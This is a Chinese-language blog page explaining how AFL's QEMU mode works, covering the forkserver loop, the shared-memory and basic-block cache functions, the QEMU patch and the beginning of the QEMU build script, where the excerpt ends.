class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 进入forkserver进程</span></span><br><span class="line">    <span class="comment">/* Parent. */</span></span><br><span class="line"></span><br><span class="line">    close(TSL_FD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(FORKSRV_FD + <span class="number">1</span>, &amp;child_pid, <span class="number">4</span>) != <span class="number">4</span>) <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collect translation requests until child dies and closes the pipe. */</span></span><br><span class="line"></span><br><span class="line">    afl_wait_tsl(cpu, t_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get and relay exit status to parent. */</span></span><br><span class="line">    <span class="comment">// 获取目标程序进程的结束信息，并通过状态管道写回到afl-fuzz主进程中</span></span><br><span class="line">    <span class="keyword">if</span> (waitpid(child_pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">if</span> (write(FORKSRV_FD + <span class="number">1</span>, &amp;status, <span class="number">4</span>) != <span class="number">4</span>) <span class="built_in">exit</span>(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>forkserver 的代码主要流程就是：</p>
<ol>
<li>首先通过状态管道发送数据给 afl-fuzz 主进程，说明 forkserver 创建成功，然后进入 while(1) 循环。在循环中 forkserver 会 read 阻塞在控制管道，等待 alf-fuzz 主进程发送消息。</li>
<li>从控制管道接受到 afl-fuzz 主进程发送的数据后，forkserver fork 出新的子进程，此时的子进程也就是新的目标程序进程，会关闭与afl-fuzz通信的管道，返回继续向下执行目标程序进程在 qemu 中的代码。此时父进程 forkserver 则将新 fork 出来的目标程序进程 pid 通过状态管道发送给afl-fuzz</li>
<li>之后 forkserver 进程进入 afl_wait_tsl，不断循环处理目标程序进程翻译基本块的请求。</li>
<li>最后当目标程序进程执行完毕后，forkserver 获取结束信息，将结束信息通过控制管道发送给 afl-fuzz 用于判断处理 crash。</li>
</ol>
<h2 id="相关函数解析"><a href="#相关函数解析" class="headerlink" title="相关函数解析"></a>相关函数解析</h2><p>如上是 qemu mode 中 forkserver 的基本流程，如下对中间涉及到的函数进行简单说明：</p>
<h3 id="static-void-afl-setup-void"><a href="#static-void-afl-setup-void" class="headerlink" title="static void afl-setup(void)"></a>static void afl-setup(void)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set up SHM region and initialize other stuff. */</span></span><br><span class="line"><span class="comment">// 设置共享内存和相关初始化</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">afl_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 从环境变量SHM_ENV_VAR中获取共享内存ID</span></span><br><span class="line">  <span class="type">char</span> *id_str = getenv(SHM_ENV_VAR),</span><br><span class="line">       *inst_r = getenv(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> shm_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_r) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">    r = atoi(inst_r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (r &gt; <span class="number">100</span>) r = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span> (!r) r = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    afl_inst_rms = MAP_SIZE * r / <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (id_str) &#123;</span><br><span class="line">    <span class="comment">// 获取共享内存ID</span></span><br><span class="line">    shm_id = atoi(id_str);</span><br><span class="line">    <span class="comment">// 获取共享内存指针</span></span><br><span class="line">    afl_area_ptr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (afl_area_ptr == (<span class="type">void</span>*)<span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* With AFL_INST_RATIO set to a low value, we want to touch the bitmap</span></span><br><span class="line"><span class="comment">       so that the parent doesn&#x27;t give up on us. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inst_r) afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_INST_LIBS&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    afl_start_code = <span class="number">0</span>;</span><br><span class="line">    afl_end_code   = (abi_ulong)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* pthread_atfork() seems somewhat broken in util/rcu.c, and I&#x27;m</span></span><br><span class="line"><span class="comment">     not entirely sure what is the cause. This disables that</span></span><br><span class="line"><span class="comment">     behaviour, and seems to work alright? */</span></span><br><span class="line">  <span class="comment">// 线程安全相关？</span></span><br><span class="line">  rcu_disable_atfork();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在 afl_setup 函数中，最主要的就是从相关环境变量获取到共享内存的指针，用于之后进行覆盖率信息统计。</p>
<h3 id="static-void-afl-wait-tsl-CPUState-cpu-int-fd"><a href="#static-void-afl-wait-tsl-CPUState-cpu-int-fd" class="headerlink" title="static void afl_wait_tsl(CPUState *cpu, int fd)"></a>static void afl_wait_tsl(CPUState *cpu, int fd)</h3><p>首先通过分析 qemu mode 的 patch 可知，qemu 在翻译每一个基本块之后，都会执行宏 AFL_QEMU_CPU_SNIPPET1，</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -365,6 +369,7 @@</span></span><br><span class="line">             if (!tb) &#123;</span><br><span class="line">                 /* if no translated code available, then translate it now */</span><br><span class="line">                 tb = tb_gen_code(cpu, pc, cs_base, flags, 0);</span><br><span class="line"><span class="addition">+                AFL_QEMU_CPU_SNIPPET1;</span></span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_QEMU_CPU_SNIPPET1 do &#123; \</span></span><br><span class="line"><span class="meta">    afl_request_tsl(pc, cs_base, flags); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<p>在宏中主要是执行函数 afl_request_tsl，代码如下，基本流程就是：目标程序进程如果需要翻译一个新的基本块，将基本块信息发送给forkserver，让其加入到基本块 cache 中。这样 forkserver 下次 fork 出来一个新的目标程序进程的时候，就可从 cache 中不用再次翻译基本块，提高性能。该函数是在 forkserver fork 出来的目标程序进程中执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This code is invoked whenever QEMU decides that it doesn&#x27;t have a</span></span><br><span class="line"><span class="comment">   translation of a particular block and needs to compute it. When this happens,</span></span><br><span class="line"><span class="comment">   we tell the parent to mirror the operation, so that the next fork() has a</span></span><br><span class="line"><span class="comment">   cached copy. */</span></span><br><span class="line"><span class="comment">// 此代码只有当qemu翻译一个新的基本块tb时才会执行，并会将其加入到forkserver中，使得下一次fork目标程序进程有cache备份</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">afl_request_tsl</span><span class="params">(target_ulong pc, target_ulong cb, <span class="type">uint64_t</span> flags)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">afl_tsl</span> <span class="title">t</span>;</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!afl_fork_child) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  t.pc      = pc;</span><br><span class="line">  t.cs_base = cb;</span><br><span class="line">  t.flags   = flags;</span><br><span class="line">  <span class="comment">// 通过管道发送给forkserver，加入到基本块tb cache中</span></span><br><span class="line">  <span class="keyword">if</span> (write(TSL_FD, &amp;t, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> afl_tsl)) != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> afl_tsl))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次就是 afl_wait_tsl 函数，该函数在 forkserver 中执行。代码的流程是，forkserver 执行该函数进入死循环不断接受来自目标程序进程的基本块翻译情况，接收到信息说明目标程序进程翻译了一个新的基本块，那么 forkserver 就在自身的 cache 中搜索该基本块。如果该基本块不在 cache 中，则将该基本块加入到 cache，这样下一次 forkserver fork 新进程就可以使用该缓存，避免重复翻译，提高性能。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is the other side of the same channel. Since timeouts are handled by</span></span><br><span class="line"><span class="comment">   afl-fuzz simply killing the child, we can just wait until the pipe breaks. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">afl_wait_tsl</span><span class="params">(CPUState *cpu, <span class="type">int</span> fd)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">afl_tsl</span> <span class="title">t</span>;</span></span><br><span class="line">  TranslationBlock *tb;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Broken pipe means it&#x27;s time to return to the fork server routine. */</span></span><br><span class="line">	<span class="comment">// 循环接受来自fork出来的子进程的基本块翻译请求</span></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;t, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> afl_tsl)) != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> afl_tsl))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">	<span class="comment">// 从forkserver的基本块缓存中搜索fork出来的目标进程的基本块</span></span><br><span class="line">    tb = tb_htable_lookup(cpu, t.pc, t.cs_base, t.flags);</span><br><span class="line">	<span class="comment">// 如果forkserver的基本块缓存中没有搜索到，则翻译基本块并加入到forkserver的缓存中</span></span><br><span class="line">    <span class="keyword">if</span>(!tb) &#123;</span><br><span class="line">      mmap_lock();</span><br><span class="line">      tb_lock();</span><br><span class="line">      tb_gen_code(cpu, t.pc, t.cs_base, t.flags, <span class="number">0</span>);</span><br><span class="line">      mmap_unlock();</span><br><span class="line">      tb_unlock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结这篇文章的原因是自己一直没有理解到 forkserver 是如何执行的，毕设涉及到 qemu mode，也需要稍微了解下其中的原理。其实 afl 的 qemu mode 从原理进行分析还是挺简单的，直接分析 patch 文件，看在 qemu 的哪些源码处进行了修改。然后再简单看一下是如何在 qemu 的翻译基本块前后进行相关判断和插桩的。代码量并不多，看完之后对 afl 有了更深的了解，也理解到了 forkserver 在 qemu 模式中是如何启动的，以及通过将每次新翻译的基本块加入到 forkserver 的 cache 中实现性能优化。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/11614235.html">[hac425师傅] 基于qemu和unicorn的Fuzz技术分析</a></li>
<li><a href="https://oneshell.top/2022/01/03/afl%20qemu%E6%A8%A1%E5%BC%8F%E7%AE%80%E4%BB%8B/">[OneShell] afl-qemu模式简介</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/afl%20qemu%20mode%E7%AE%80%E4%BB%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/afl%20qemu%20mode%E7%AE%80%E4%BB%8B/" class="post-title-link" itemprop="url">afl qemu mode简介</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 09:47:28 / Modified: 09:51:28" itemprop="dateCreated datePublished" datetime="2023-04-13T09:47:28+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-qemu-模式简介"><a href="#afl-qemu-模式简介" class="headerlink" title="afl qemu 模式简介"></a>afl qemu 模式简介</h1><p>这篇文章主要是参考了 <a target="_blank" rel="noopener" href="http://mozhucy.cn/2020/03/13/afl-qemu/">afl-qemu</a>，并简单扩展了自己对 QEMU 的理解和最近对于 AFL 源码阅读的一些理解。</p>
<h2 id="qemu-简介"><a href="#qemu-简介" class="headerlink" title="qemu 简介"></a>qemu 简介</h2><p>qemu 在 IoT 漏洞挖掘和复现中被使用得很多用来进行固件的模拟，根据模拟的级别可以分为用户程序模拟和系统虚拟化模拟。</p>
<p>用户程序模拟就是 QEMU 能够将一个平台编译的二进制文件运行在另外一个不同的平台，例如一个 ARM 指令集的二进制程序，通过 QEMU 的 TCG（Tiny Code Generator）处理之后，ARM 指令被转换成 TCG 的中间代码，然后再转换成目的平台的代码。</p>
<p>系统虚拟化模拟指的是 QEMU 能够模拟一个完整的操作系统虚拟机，该虚拟机有自己的虚拟 CPU、芯片组、虚拟内存以及其他的虚拟外设例如网卡，能够给虚拟机中运行的操作系统提供和物理硬件平台一致的硬件视图。</p>
<p>QEMU 能够模拟的平台也很多，常见的 x86&#x2F;64、ARM、MIPS、PPC 等，早期的 QEMU 都是通过 TCG 来完成对硬件平台的模拟，所有的虚拟机指令也需要通过 QEMU 来进行转换，这个地方不继续深入说明，就简单知道有这个基本 TCG 进行指令翻译的流程。回到正式话题，如果我们要对某个其他指令集的二进制文件进行模糊测试，就可以使用 afl 的 qemu mode。</p>
<p>当我们使用 qemu 来加载一个其他指令集的可执行文件（ELF 为例）时，基本的流程如下：</p>
<ul>
<li>qemu 初始化</li>
<li>TCG 初始化</li>
<li>CPU 初始化</li>
<li>加载可执行文件，以 ELF 为例，有对 ELF 的解析过程</li>
<li>syscall 初始化，qemu 是将可执行文件的系统调用转发到宿主机的系统调用来实现</li>
<li>signal 初始化，在 afl 中也是根据 target 执行过程中的 signal 或者结束代码来判断 crash</li>
<li>gdbserver 初始化，如果启动 qemu 的时候选择调试 -g</li>
<li>cpu_loop 开始模拟</li>
</ul>
<p>如上，重要的流程就是 QEMU 分析目标程序的 ELF 结构，分配必要的内存，装载所需要的库，然后开始进行指令集的翻译、执行，并且将遇见的 syscall 系统调用转发到宿主机进行模拟。CPU 执行的基本流程大概是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (;;) &#123;</span><br><span class="line">	cpu_exec();</span><br><span class="line">	switch(处理退出事件)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="afl-qemu-mode"><a href="#afl-qemu-mode" class="headerlink" title="afl qemu mode"></a>afl qemu mode</h2><p>在 afl 源码的 qemu mode 文件夹，目录结构如下，其中有编译 qemu mode 的脚本，qemu-2.10.0 的源码，以及一个 readme 文档。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~/Code/AFL/qemu_mode [22:38:50] </span><br><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── build_qemu_support.sh</span><br><span class="line">├── patches</span><br><span class="line">├── qemu-2.10.0</span><br><span class="line">├── qemu-2.10.0.tar.xz</span><br><span class="line">└── README.qemu</span><br><span class="line"></span><br><span class="line">2 directories, 3 files</span><br></pre></td></tr></table></figure>

<p>在 readme 文档中，有对 qemu mode 的简单介绍，是基于 QEMU 的用户级模拟，用于仿真黑盒闭源二进制文件。</p>
<blockquote>
<ol>
<li>Introduction</li>
</ol>
<hr>
<p>The code in this directory allows you to build a standalone feature that<br>leverages the QEMU “user emulation” mode and allows callers to obtain<br>instrumentation output for black-box, closed-source binaries. This mechanism<br>can be then used by afl-fuzz to stress-test targets that couldn’t be built<br>with afl-gcc.</p>
<p>The usual performance cost is 2-5x, which is considerably better than<br>seen so far in experiments with tools such as DynamoRIO and PIN.</p>
<p>The idea and much of the implementation comes from Andrew Griffiths.</p>
</blockquote>
<p>接下来就是看看 qemu mode 的编译流程，其中大概做了一些注释</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Copyright 2015 Google LLC All rights reserved.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">you may not use this file except <span class="keyword">in</span> compliance with the License.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">You may obtain a copy of the License at:</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   http://www.apache.org/licenses/LICENSE-2.0</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Unless required by applicable law or agreed to in writing, software</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">distributed under the License is distributed on an <span class="string">&quot;AS IS&quot;</span> BASIS,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See the License <span class="keyword">for</span> the specific language governing permissions and</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">limitations under the License.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-----------------------------------------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">american fuzzy lop - QEMU build script</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--------------------------------------</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Written by Andrew Griffiths &lt;agriffiths@google.com&gt; and</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">           Michal Zalewski &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># This script downloads, patches, and builds a version of QEMU with</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">minor tweaks to allow non-instrumented binaries to be run under</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">afl-fuzz.</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># The modifications reside in patches/*. The standalone QEMU binary</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">will be written to ../afl-qemu-trace.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"></span><br><span class="line">VERSION=&quot;2.10.0&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">QEMU 2.10.0 源码下载</span></span><br><span class="line">QEMU_URL=&quot;http://download.qemu-project.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br><span class="line">QEMU_SHA384=&quot;68216c935487bc8c0596ac309e1e3ee75c2c4ce898aab796faa321db5740609ced365fedda025678d072d09ac8928105&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;=================================================&quot;</span><br><span class="line">echo &quot;AFL binary-only instrumentation QEMU build script&quot;</span><br><span class="line">echo &quot;=================================================&quot;</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Performing basic sanity checks...&quot;</span><br><span class="line"></span><br><span class="line">if [ ! &quot;`uname -s`&quot; = &quot;Linux&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: QEMU instrumentation is supported only on Linux.&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行patch</span></span><br><span class="line">if [ ! -f &quot;patches/afl-qemu-cpu-inl.h&quot; -o ! -f &quot;../config.h&quot; ]; then</span><br><span 